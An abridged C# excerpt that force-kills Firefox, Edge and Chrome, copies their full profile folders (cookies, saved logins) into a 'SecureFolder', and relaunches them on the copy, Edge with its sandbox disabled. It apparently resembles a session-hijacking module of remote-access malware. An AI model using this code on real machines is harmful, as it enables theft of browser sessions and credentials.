    ...
    class Process_Handler
    {
        ...
        private void CloneDirectory(string sourceDir, string destinationDir)
        {
            ...
            foreach (FileInfo file in source.GetFiles())
            {
                ...
                {
                    Console.WriteLine($"Could not copy file '{file.FullName}': {ex.Message}");
                }
            }

            foreach (DirectoryInfo subDir in source.GetDirectories())
            {
                string destSubDirPath = Path.Combine(destinationDir, subDir.Name);
                CloneDirectory(subDir.FullName, destSubDirPath);
            }
        }



        static bool DeleteFolder(string folderPath)
        {
            try
            {
        ...
        public void StartFirefox()
        {
            ...
            string Firefoxpath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            Firefoxpath = string.Concat(Firefoxpath, "\\Mozilla\\Firefox\\");
            string datapath = Path.Combine(Firefoxpath, "Profiles");
            string newDatapath = Path.Combine(Firefoxpath, "SecureFolder");
            string killcEdgw = "cmd.exe taskkill /IM firefox.exe /F ";

            if (!Directory.Exists(newDatapath))
            {

                CreateProc(killcEdgw);
                Directory.CreateDirectory(newDatapath);


                CloneDirectory(datapath, newDatapath);
            ...
            {
                bool ddd = DeleteFolder(newDatapath);
            ...
            string path = "cmd.exe /c start firefox " + "-new-window -safe-mode -no-remote -profile " + newDatapath;
        ...
        public void StartEdge()
        {
            ...
            chromepath = string.Concat(chromepath, "\\Microsoft\\Edge\\");
            string datapath = Path.Combine(chromepath, "User Data");
            string newDatapath = Path.Combine(chromepath, "SecureFolder");
            string killcEdgw = "cmd.exe taskkill /IM msedge.exe /F ";
            ...
            string path = "cmd.exe /c start msedge.exe " + "--start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=" + newDatapath;
        ...
        public bool Startchrome()
        {
            try
            {
                ...
                string killchrom = "cmd.exe taskkill /IM chrome.exe /F ";
